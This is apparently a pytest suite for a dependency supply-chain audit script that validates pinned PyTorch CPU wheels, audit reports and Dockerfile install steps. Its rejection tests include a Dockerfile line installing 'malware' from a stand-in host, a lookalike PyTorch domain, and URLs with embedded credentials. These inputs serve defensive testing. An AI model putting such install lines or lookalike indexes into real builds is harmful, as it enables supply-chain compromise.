from __future__ import annotations

from copy import deepcopy

import pytest

from scripts.production_dependency_audit import (
  AuditPolicyError,
  _clean_pip_environment,
  validate_audit_report,
  validate_dockerfile_policy,
  validate_requirements_policy,
  validate_resolution_report,
  read_requirements_tree,
)


REQUIREMENTS = """\
--extra-index-url https://download.pytorch.org/whl/cpu
fastapi==0.135.4
torch==2.13.0+cpu
torchvision==0.28.0+cpu
PyJWT[crypto]==2.13.0
"""

DOCKERFILE = """\
FROM base AS dependencies-cpu
RUN pip install --no-cache-dir --upgrade setuptools==84.0.0 wheel==0.46.3
COPY requirements.txt .
RUN pip install --user -r requirements.txt
FROM base AS production
COPY --from=dependencies-cpu /runtime /runtime
FROM dependencies-cpu AS development
RUN pip install --user pytest
"""


def audit_report() -> dict:
  return {
    "dependencies": [
      {"name": "fastapi", "version": "0.135.4", "vulns": []},
      {
        "name": "torch",
        "skip_reason": (
          "Dependency not found on PyPI and could not be audited: torch (2.13.0+cpu)"
        ),
      },
      {
        "name": "torchvision",
        "skip_reason": (
          "Dependency not found on PyPI and could not be audited: torchvision (0.28.0+cpu)"
        ),
      },
      {"name": "PyJWT", "version": "2.13.0", "vulns": []},
      {"name": "starlette", "version": "1.6.0", "vulns": []},
    ],
    "fixes": [],
  }


def resolution_report() -> dict:
  return {
    "install": [
      {
        "download_info": {
          "url": (
            "https://download-r2.pytorch.org/whl/cpu/"
            "torch-2.13.0%2Bcpu-cp312-cp312-manylinux_2_28_x86_64.whl"
          ),
          "archive_info": {"hash": f"sha256={'a' * 64}"},
        },
        "metadata": {"name": "torch", "version": "2.13.0+cpu"},
      },
      {
        "download_info": {
          "url": (
            "https://download-r2.pytorch.org/whl/cpu/"
            "torchvision-0.28.0%2Bcpu-cp312-cp312-manylinux_2_28_x86_64.whl"
          ),
          "archive_info": {"hashes": {"sha256": "b" * 64}},
        },
        "metadata": {"name": "torchvision", "version": "0.28.0+cpu"},
      },
      {
        "download_info": {
          "url": "https://files.pythonhosted.org/packages/fastapi.whl",
          "archive_info": {"hash": f"sha256={'c' * 64}"},
        },
        "metadata": {"name": "fastapi", "version": "0.135.4"},
      },
    ]
  }


def test_accepts_only_the_exact_public_pytorch_cpu_audit_blind_spots():
  direct_requirements = validate_requirements_policy(REQUIREMENTS)

  skipped = validate_audit_report(audit_report(), direct_requirements)

  assert skipped == {"torch": "2.13.0+cpu", "torchvision": "0.28.0+cpu"}


@pytest.mark.parametrize(
  ("expected", "replacement"),
  [
    (
      "--extra-index-url https://download.pytorch.org/whl/cpu",
      "--extra-index-url https://mirror.example.invalid/pytorch",
    ),
    (
      "--extra-index-url https://download.pytorch.org/whl/cpu",
      "--extra-index-url https://user:secret@download.pytorch.org/whl/cpu",
    ),
    ("torch==2.13.0+cpu", "torch==2.13.1+cpu"),
    ("torch==2.13.0+cpu", "torch==2.13.0"),
  ],
)
def test_rejects_drifted_pytorch_pin_or_source(expected, replacement):
  candidate = REQUIREMENTS.replace(expected, replacement)

  with pytest.raises(AuditPolicyError):
    validate_requirements_policy(candidate)


@pytest.mark.parametrize(
  ("name", "reason"),
  [
    ("torch", "Dependency not found on PyPI and could not be audited: torch (2.13.1+cpu)"),
    ("numpy", "Dependency not found on PyPI and could not be audited: numpy (2.4.6)"),
  ],
)
def test_rejects_every_drifted_or_new_unaudited_dependency(name, reason):
  report = audit_report()
  if name == "torch":
    next(item for item in report["dependencies"] if item["name"] == name)["skip_reason"] = reason
  else:
    report["dependencies"].append({"name": name, "skip_reason": reason})

  with pytest.raises(AuditPolicyError, match="unaudited"):
    validate_audit_report(report, validate_requirements_policy(REQUIREMENTS))


def test_rejects_vulnerabilities_missing_direct_dependencies_and_version_drift():
  direct_requirements = validate_requirements_policy(REQUIREMENTS)
  vulnerable = audit_report()
  vulnerable["dependencies"][-1]["vulns"] = [{"id": "PYSEC-test"}]
  with pytest.raises(AuditPolicyError, match="vulnerabilities"):
    validate_audit_report(vulnerable, direct_requirements)

  missing = audit_report()
  missing["dependencies"] = [
    item for item in missing["dependencies"] if item["name"] != "fastapi"
  ]
  with pytest.raises(AuditPolicyError, match="did not report"):
    validate_audit_report(missing, direct_requirements)

  drifted = deepcopy(audit_report())
  next(item for item in drifted["dependencies"] if item["name"] == "PyJWT")["version"] = "2.13.1"
  with pytest.raises(AuditPolicyError, match="resolved PyJWT"):
    validate_audit_report(drifted, direct_requirements)

  contradictory_skip = audit_report()
  next(
    item for item in contradictory_skip["dependencies"] if item["name"] == "torch"
  )["vulns"] = [{"id": "PYSEC-test"}]
  with pytest.raises(AuditPolicyError, match="malformed"):
    validate_audit_report(contradictory_skip, direct_requirements)


def test_requires_exact_hashed_official_wheel_resolution_for_both_blind_spots():
  resolved = validate_resolution_report(resolution_report())

  assert resolved == {"torch": "2.13.0+cpu", "torchvision": "0.28.0+cpu"}


@pytest.mark.parametrize(
  ("package", "field", "value"),
  [
    ("torch", "url", "https://download.pytorch.org.evil.example/whl/cpu/torch.whl"),
    ("torch", "url", "https://download.pytorch.org/whl/cu130/torch.whl"),
    ("torch", "url", "https://user:secret@download.pytorch.org/whl/cpu/torch.whl"),
    ("torch", "url", "https://download.pytorch.org:invalid/whl/cpu/torch.whl"),
    ("torchvision", "version", "0.28.1+cpu"),
    ("torchvision", "hash", "sha256=missing"),
  ],
)
def test_rejects_drifted_or_unverifiable_wheel_resolution(package, field, value):
  report = resolution_report()
  item = next(entry for entry in report["install"] if entry["metadata"]["name"] == package)
  if field == "version":
    item["metadata"]["version"] = value
  elif field == "hash":
    item["download_info"]["archive_info"] = {"hash": value}
  else:
    item["download_info"][field] = value

  with pytest.raises(AuditPolicyError, match="wheel"):
    validate_resolution_report(report)


def test_keeps_the_docker_build_on_the_single_checked_requirements_source():
  validate_dockerfile_policy(DOCKERFILE)

  with pytest.raises(AuditPolicyError, match="patched build toolchain"):
    validate_dockerfile_policy(
      DOCKERFILE.replace(
        "RUN pip install --no-cache-dir --upgrade setuptools==84.0.0 wheel==0.46.3\n",
        "",
      )
    )

  with pytest.raises(AuditPolicyError, match="Dockerfile"):
    validate_dockerfile_policy(
      "RUN pip install --extra-index-url https://download.pytorch.org/whl/cpu "
      "-r requirements.txt\n"
    )

  with pytest.raises(AuditPolicyError, match="Dockerfile"):
    validate_dockerfile_policy(
      "ENV PIP_EXTRA_INDEX_URL=https://mirror.example.invalid/pytorch\n"
      "RUN pip install --user -r requirements.txt\n"
    )

  with pytest.raises(AuditPolicyError, match="Dockerfile"):
    validate_dockerfile_policy(
      "RUN pip install --find-links https://mirror.example.invalid/wheels "
      "--user -r requirements.txt\n"
    )

  with pytest.raises(AuditPolicyError, match="Dockerfile"):
    validate_dockerfile_policy("COPY requirements.txt .\n")

  with pytest.raises(AuditPolicyError, match="Dockerfile"):
    validate_dockerfile_policy(
      DOCKERFILE.replace(
        "FROM base AS production\n",
        "FROM base AS production\nRUN pip install --user malware@https://evil.invalid/malware.whl\n",
      )
    )


def test_flattens_only_local_peer_requirement_files(tmp_path):
  (tmp_path / "base.txt").write_text(REQUIREMENTS, encoding="utf-8")
  aggregate = tmp_path / "requirements.txt"
  aggregate.write_text("-r base.txt\n", encoding="utf-8")

  assert "torch==2.13.0+cpu" in read_requirements_tree(aggregate)

  aggregate.write_text("-r ../outside.txt\n", encoding="utf-8")
  with pytest.raises(AuditPolicyError, match="local peer"):
    read_requirements_tree(aggregate)


def test_removes_inherited_pip_source_and_tls_overrides(monkeypatch):
  monkeypatch.setenv("PIP_INDEX_URL", "https://user:secret@example.invalid/simple")
  monkeypatch.setenv("PIP_FIND_LINKS", "https://mirror.example.invalid/wheels")
  monkeypatch.setenv("PIP_TRUSTED_HOST", "download.pytorch.org")
  monkeypatch.setenv("AUDIT_SAFE_SENTINEL", "preserved")

  environment = _clean_pip_environment()

  assert environment["AUDIT_SAFE_SENTINEL"] == "preserved"
  assert environment["PIP_CONFIG_FILE"] == "/dev/null"
  assert environment["PIP_DISABLE_PIP_VERSION_CHECK"] == "1"
  assert environment["PIP_NO_INPUT"] == "1"
  assert set(key for key in environment if key.startswith("PIP_")) == {
    "PIP_CONFIG_FILE",
    "PIP_DISABLE_PIP_VERSION_CHECK",
    "PIP_NO_INPUT",
  }
